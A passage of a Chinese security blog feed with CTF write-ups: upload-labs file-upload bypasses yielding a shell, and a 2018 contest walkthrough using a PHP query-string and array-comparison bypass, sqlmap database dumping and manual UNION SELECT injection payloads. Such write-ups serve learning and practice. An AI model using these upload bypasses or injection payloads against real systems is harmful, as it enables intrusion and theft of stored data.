        $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-12"><a href="#pass-12" class="headerlink" title="pass"></a>pass</h4><p>利用条件竞争删除文件时间差绕过。 </p><p>文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传 </p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>利用上传重命名竞争+Apache解析漏洞，成功绕过。</p><p>上传名字为<code>18.php.7Z</code>的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。</p><p>然后利用Apache的解析漏洞，即可获得shell </p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pathinfo — 返回文件路径的信息(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p><p>pathinfo() 函数以数组的形式返回关于文件路径的信息。</p><p>返回的数组元素如下：</p><ul><li>[dirname]</li><li>[basename]</li><li>[extension]</li></ul><p>语法</p><blockquote><p>pathinfo(path,options)</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要检查的路径。</td></tr><tr><td>options</td><td>可选。规定要返回的数组元素。默认是 all。<br>可能的值：<br>PATHINFO_DIRNAME - 只返回 dirname<br>PATHINFO_BASENAME - 只返回 basename<br>PATHINFO_EXTENSION - 只返回 extension</td></tr></tbody></table><h4 id="pass-13"><a href="#pass-13" class="headerlink" title="pass"></a>pass</h4><p>大小写绕过</p><p>save_name修改为<code>caidao19.php.</code>即可 </p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0writeup.assets/1530613222876.png" alt="1530613222876"></p><p>参考writeup：</p><p><a href="https://fuping.site/2018/06/04/upload-labs-writeup/" target="_blank" rel="noopener">https://fuping.site/2018/06/04/upload-labs-writeup/</a></p><p><a href="https://github.com/LandGrey/upload-labs-writeup" target="_blank" rel="noopener">https://github.com/LandGrey/upload-labs-writeup</a></p><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">当php邂逅windows通用上传缺陷</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;c0ny1师傅写的upload-labs，受益良多&lt;/p&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="upload" scheme="http://blog.Lhaihai.wang/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>2018安恒五月月赛WriteUp</title>
    <link href="http://blog.Lhaihai.wang/2018/05/22/2018%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E6%9C%88%E8%B5%9BWriteUp/"/>
    <id>http://blog.Lhaihai.wang/2018/05/22/2018安恒五月月赛WriteUp/</id>
    <published>2018-05-22T15:18:21.000Z</published>
    <updated>2018-05-22T15:23:14.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><blockquote><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 </p></blockquote><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure><p>分析一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</span><br></pre></td></tr></table></figure><p>如果有get参数A_A，就把A_A的值赋给$str</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。 </p><p>$_SERVER[“QUERY_STRING”]获取查询语句，实例中可知，获取的是?后面的值 </p><p>例如<code>http://101.71.29.5:10007/?A_A=1</code></p><p>$_SERVER[“QUERY_STRING”]的值是：<code>A_A=1</code></p><p>那么怎么绕过这个strpos并且把$str赋值呢？</p><p>我们来了解一下下面这个php特性</p><blockquote><p>php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。 那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的<code>$_REQUEST[&#39;user_id&#39;]</code>就是22222。 </p></blockquote><p>那么这里绕过可以用A.A,A+A(这道题测试+也是可以绕过)</p><p><a href="https://blog.csdn.net/iamtheodore/article/details/6098521" target="_blank" rel="noopener">PHP获取当前url路径的函数及服务器变量:QUERY_STRING、REQUEST_URI、SCRIPT</a> </p><p><a href="https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/" target="_blank" rel="noopener">https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里判断</p><p>$str不能小于9999999999，</p><p>(string)$str不能大于0</p><p>贴一下xsser直播讲解的例子，我们可以看到 []&gt;9999999是真，[]&gt;-1也是真，反过来就是[]&lt;999999为假</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526966811732.png" alt="1526966811732"></p><p>自己再测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&lt;<span class="number">999999</span>);</span><br><span class="line">var_dump((string)[]);</span><br><span class="line">var_dump((string)[]&gt;<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boolean false</span><br><span class="line">string &apos;Array&apos; (length=5)</span><br><span class="line">boolean false</span><br></pre></td></tr></table></figure><p>我们可以看到 (string)[]，php会把数组经过string转换后变为  </p><p> 值为Array的string类型</p><p>因为当字符串和数字比较时，php会把字符串转换为int类型，如果字符串开头是字符，就转换为0</p><p>这样就绕过了<code>elseif ((string)$str&gt;0)</code></p><p>不理解的话再放xsser的两张ppt</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968028071.png" alt="1526968028071"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968048447.png" alt="1526968048447"></p><p>最后总结一下：</p><blockquote><ol><li>用 <code>A.A</code>绕过<code>if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false)</code></li><li>用数组绕过 <code>($str&lt;9999999999)</code>  和 <code>((string)$str&gt;0)</code></li></ol></blockquote><p>playload</p><blockquote><p><a href="http://101.71.29.5:10007/?A+A[]=1" target="_blank" rel="noopener">http://101.71.29.5:10007/?A+A[]=1</a></p></blockquote><p>查看源代码即可看到flag</p><blockquote><p>flag={09bc24026c987ae44a6e424479b2e3} </p></blockquote><p><a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</a> </p><h2 id="不能注册的admin"><a href="#不能注册的admin" class="headerlink" title="不能注册的admin"></a>不能注册的admin</h2><blockquote><p>你敢注册一个“admin”账户吗？敢吗？你试试？ </p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526968952854.png" alt="1526968952854"></p><p>查看源代码发现有一段js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">id = $(<span class="string">"#uid"</span>).val();</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">"#uid"</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(id !== <span class="string">""</span>|| !id)&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:<span class="string">"json.php"</span>,<span class="attr">type</span>:<span class="string">'post'</span>,<span class="attr">data</span>:&#123;<span class="string">'id'</span>:id&#125;,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">d</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> data = <span class="built_in">eval</span>(<span class="string">'('</span> +d +<span class="string">')'</span>);</span><br><span class="line"><span class="keyword">if</span>(data[<span class="string">'id'</span>] !=<span class="string">'undefined'</span> ||data[<span class="string">'id'</span>] !=<span class="string">""</span> ||data[<span class="string">'id'</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">alert(<span class="string">'用户名已存在!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>分析一波，这段代码就是把id参数post给json.php</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970455005.png" alt="1526970455005"></p><p>尝试一波注入，发现不行</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970480922.png" alt="1526970480922"></p><p>查看一下网络，发现响应头写着(Win32)，那可能是windows服务器</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970551824.png" alt="1526970551824"></p><p>想到windows大小写不敏感</p><blockquote><p>1、在window系统中，所有的文件夹或者文件名是不区分大小写的。即在同一个目录下不能同时存在名称相同大小写不一样的文件夹或者文件。</p><p>2、在压缩文件中是可以同时存在如上所述的文件的。例如：文件夹a 和 文件夹A 以及test.txt和TEST.txt是可以同时存在同一目录下的。</p></blockquote><p>补充学习：</p><p><a href="https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten" target="_blank" rel="noopener">https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten</a> Uploader</p><p>实验发现，在Windows系统中， &lt; 符号可以代替扩展名的一部分，如果没有扩展名（没有 <strong>.</strong> ）就可以代替全部。</p><p>例如此目录下有 index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index&lt;&quot;</span><br><span class="line">系统找不到指定的文件。</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.p&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.php&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br><span class="line"> </span><br><span class="line">D:\www\test&gt;type &quot;index.php&lt;&lt;&lt;&quot;</span><br><span class="line">&lt;?php</span><br><span class="line">readfile(&apos;./FL&lt;&apos;);</span><br></pre></td></tr></table></figure><p>于是把php改为phP，就可以注入了</p><p>先上sqlmap</p><p>获取数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --dbs -p id --thread 10</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969664379.png" alt="1526969664379"></p><p>拿到当前数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin <span class="comment">--flush -p id --thread 10 --current-db</span></span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526969882637.png" alt="1526969882637"></p><p>获得表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb --tables</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970077793.png" alt="1526970077793"></p><p>拿到表里面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb -T article --dump</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526970228303.png" alt="1526970228303"></p><p>尝试手动注入一波</p><p>单引号没反应</p><p>双引号报错了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fatal error: Uncaught exception &apos;Exception&apos; with message &apos;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&apos; at line 1 query: select * from article where title =&quot;admin&quot; &quot;&apos; in E:\apache2\htdocs\MysqliDb.php:1926 Stack trace: #0 E:\apache2\htdocs\MysqliDb.php(516): MysqliDb-&gt;_prepareQuery() #1 E:\apache2\htdocs\MysqliDb.php(550): MysqliDb-&gt;rawQuery(&apos;select * from a...&apos;, NULL) #2 E:\apache2\htdocs\json.php(39): MysqliDb-&gt;rawQueryOne(&apos;select * from a...&apos;) #3 &#123;main&#125; thrown in E:\apache2\htdocs\MysqliDb.php on line 1926</span><br></pre></td></tr></table></figure><p>发现这一句，要用双引号闭合</p><blockquote><p>select * from article where title =”admin” “‘ in </p></blockquote><p>order by 判断一下，4的时候错误，那就说明表有三列</p><blockquote><p>id=admin” order by 3%23</p></blockquote><p>把admin随便换一个，这样前面没有数据就会把union select的值输出，这里发现把1和2输出</p><blockquote><p>id=-“ union select 1,2,3%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971766987.png" alt="1526971766987"></p><p>获得数据库 5monthweb</p><blockquote><p>id=-“ union select user(),database(),3%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526971888625.png" alt="1526971888625"></p><p>获得表名 article </p><blockquote><p>id=-“ union select user(),table_name,3 from information_schema.tables where table_schema = database()%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972049073.png" alt="1526972049073"></p><p>获得列名 id,title,content </p><blockquote><p>id=-“ union select user(),group_concat(column_name),3 from information_schema.columns where table_schema = database()%23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972166936.png" alt="1526972166936"></p><p>得表里面的数据</p><blockquote><p>id=-“ union select user(),concat_ws(char(32,58,32),id,title,content),3 from 5monthweb.article %23</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526972278977.png" alt="1526972278977"></p><blockquote><p>flag{you_are_admin}</p></blockquote><p>附上安恒杯月赛讲解视频链接</p><blockquote><p>直播地址：<a href="http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024" target="_blank" rel="noopener">http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024</a> </p><p>解题讲师：你们最最熟悉的xsser老师 </p></blockquote><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="wifi密码是多少"><a href="#wifi密码是多少" class="headerlink" title="wifi密码是多少"></a>wifi密码是多少</h2><blockquote><p>你猜猜 咱们的wifi密码是多少？ 你懂操作系统吗 哈哈哈哈  </p></blockquote><p>文件：5afea37acccbc.bin</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/%E5%AE%89%E6%81%92%E6%9D%AF2018%E4%BA%94%E6%9C%88%E5%9C%BA.assets/1526805894626.png" alt="1526805894626"></p><blockquote><p>flag{Y0ung_m4n_u_are_s0_coo1!}</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;奇怪的恐龙特性&quot;&gt;&lt;a href=&quot;#奇怪的恐龙特性&quot; class=&quot;headerlink&quot; title=&quot;奇怪的恐龙特性&quot;&gt;&lt;/a&gt;奇怪的恐龙特性&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="WriteUp" scheme="http://blog.Lhaihai.wang/categories/WriteUp/"/>
    
    
      <category term="Web" scheme="http://blog.Lhaihai.wang/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CSP学习笔记</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/CSP学习笔记/</id>
    <published>2018-05-20T14:41:21.000Z</published>
    <updated>2018-05-20T16:25:46.389Z</updated>
    
